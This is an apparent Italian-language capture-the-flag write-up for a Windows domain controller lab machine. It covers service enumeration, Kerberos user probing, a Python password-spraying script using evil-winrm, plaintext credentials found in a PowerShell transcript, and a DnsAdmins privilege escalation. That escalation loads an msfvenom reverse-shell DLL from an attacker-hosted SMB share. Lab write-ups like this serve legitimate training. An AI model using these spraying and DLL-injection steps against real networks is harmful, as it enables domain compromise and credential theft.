## Information Gathering

Tramite una prima scansione al volo con nmap scopro i seguenti servizi interessanti attivi:

```
nmap -sV -sS -O -A <IP>

PORT     STATE SERVICE      VERSION
53/tcp   open  domain
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-02 17:57:14Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped

```

Contemporaneamente con enum4linux sono emersi diversi usernames e gruppi. Prelevo il frammento e "pulisco" il testo per estrarre gli usernames puliti con il seguente script:

```
import re 

users = "[Administrator] rid:[0x1f4] \
user:[Guest] rid:[0x1f5] \
etc..."

usr = users.split("user")

for x in usr:
	y = re.findall("\[(.*?)\]", x)[0]
	with open("clean_usr.txt", mode="w+") as f:
    f.write(y)
```
Creato il listato, lo uso per provare a sniffare dei TGT dal servizio di Kerberos:

```
python GetNPUsers.py htb.local/ -no-pass -usersfile clean_user.txt -dc-ip 10.10.10.XXX
```
Ma non ne ricavo nulla...
Quindi effettuo anche una scansione del servizio rpcclient:

```
rpcclient -W workgroup -c querydispinfo -U '' -N  res
```

E scopro una password default per l'utenza "marko": Welcome123!

## Exploiting in the System

A questo punto, grazie a [Lorenzo Invidia](https://github.com/lorenzoinvidia), scopro che la password non è più valida per Marko, tuttavia potrebbe essere valida per altri!

Quindi scrivo il seguente script, che prova a collegarsi alla macchina (e con la password sopracitata) per tutti gli utenti ricavati:

```
import os

with open("users_list.txt", mode="r") as f:
	users = f.read().splitlines()

for x in users:
	stream = os.popen("evil-winrm -u "+ x +" -p Welcome123! -i resolute")

	if "WinRM::WinRMAuthorizationError" in stream.read():
		print "[-] " + x + " non valido"
	else:
		print "[*] Utente trovato: " + x
		exit(0)
```

Trovo così l'utenza di melanie. Entro nel sistema e trovo il primo flag!

## Privilege Escalation

#### Phase 1

Ho tentato svariati tentativi, ho lanciato WinPeas, ho provato a recuperare le credenziali di AutoLogon di Administrator tramite Metasploit ma non sono riuscito a recuperare niente. Questo punto ho notato che esistono tanti utenti presenti all'interno del sistema quindi ho ricercato possibili credenziali in chiaro. 

Inizialmente non ho rinvenuto alcun file, quindi ho cercato i file nascosti (partendo da melanie) con:

```
Get-ChildItem -Force -Hidden -Recurse 2>$null
```

Ma non ho trovato nulla. Quindi, facendo partire il comando dalla root del disco C: trovo parecchi file interessanti nascosti, fra cui anche il SAM e SYSTEM. (Ma forse non sono accessibili, non ho provato).

Fra tutti i file, mi è saltato all'occhio:

* PowerShell_transcript...txt

Aprendolo trovo le credenziali per l'utente ryan, in chiaro! Quindi loggo all'interno del sistema con le sue creds.

#### Phase 2

Ho lanciato nuovamente winPEAS ma non ho trovato nulla, quindi comincio con la verifica dei permessi e dei gruppi:

```
net user ryan /domain
```
Ma non trovo niente, quindi provo con: 
```
whoami /all
```

E leggo la riga: 

```
MEGABANK\DnsAdmins   Alias S-1-5-21-[...]-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group

```

Quindi noto che appartiene al gruppo DnsAdmins, vulnerabile (di cui esiste anche un exploit in Msf).

Innanzitutto genero una dll infetta con payload una reverse_tcp_shell:

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll > privesc.dll
```
Quindi lo metto in hosting tramite samba:

```
mbserver.py share ./

```

A questo punto dalla macchina windows inietto la DLL:

```
dnscmd DC /config /serverlevelplugindll \\<HOST>\share\privesc.dll
```
Quindi verifico con:
```

Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

Metto in ascolto NetCat, infine lancio i seguenti comandi per riavviare la configurazione dns sulla macchina vittima:

```
sc.exe <X> stop dns
sc.exe <X> start dns
```
That's it! Root's Flag :) 
